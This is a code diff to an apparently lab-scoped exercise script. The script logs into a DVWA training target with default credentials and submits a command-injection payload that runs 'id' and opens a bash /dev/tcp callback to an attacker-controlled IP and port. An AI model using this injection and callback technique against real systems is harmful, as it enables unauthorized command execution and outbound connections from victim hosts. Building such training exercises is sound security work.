@@ -21,10 +21,9 @@ import urllib.parse
 import urllib.request
 
 LAB = "/etc/opaleye/lab.json"
-CALLBACK_PORT = 4444
 
 
-def now():
+def stamp():
     return datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
 
 
@@ -64,33 +63,35 @@ def main(argv):
     ap.add_argument("--target", default=None, help="t1 or t2 (address from /etc/opaleye/lab.json)")
     ap.add_argument("--base-url", default=None, help="override http://<target ip>")
     ap.add_argument("--attacker-ip", default=None)
+    ap.add_argument("--callback-port", type=int, default=None, help="port the target tries to reach (plan ops.callback_port)")
     ap.add_argument("--workdir", default="/srv/exercise")
     ap.add_argument("--user", default="admin")
     ap.add_argument("--password", default="password", help="DVWA default credentials")
     a = ap.parse_args(argv[1:])
 
-    base, attacker = a.base_url, a.attacker_ip
-    if not (base and attacker):
+    base, attacker, port = a.base_url, a.attacker_ip, a.callback_port
+    if not (base and attacker and port):
         try:
             with open(LAB) as f:
                 lab = json.load(f)
         except OSError:
             raise SystemExit("no %s: give --base-url and --attacker-ip" % LAB)
         attacker = attacker or lab["attacker_ip"]
+        port = port or lab["callback_port"]
         if not base:
             if a.target not in lab["targets"]:
                 raise SystemExit("--target must be one of %s" % ", ".join(lab["targets"]))
             base = "http://%s" % lab["targets"][a.target]
     s = Session(base, "opaleye-exercise1/" + a.exercise_id)
 
-    payload = "127.0.0.1; id; bash -c 'echo opaleye-%s > /dev/tcp/%s/%d'" % (a.exercise_id, attacker, CALLBACK_PORT)
-    started = now()
+    payload = "127.0.0.1; id; bash -c 'echo opaleye-%s > /dev/tcp/%s/%d'" % (a.exercise_id, attacker, port)
+    started = stamp()
     s.post("/login.php", {"username": a.user, "password": a.password, "Login": "Login",
                           "user_token": s.token("/login.php")})
     s.set_cookie("security", "low")
     _, out = s.post("/vulnerabilities/exec/", {"ip": payload, "Submit": "Submit",
                                                 "user_token": s.token("/vulnerabilities/exec/")})
-    ended = now()
+    ended = stamp()
     ran = bool(re.search(r"uid=\d+\(", out))
     record = {"exercise_id": a.exercise_id, "target": a.target, "base_url": base, "started": started, "ended": ended,
               "payload": payload, "command_output_seen": ran}
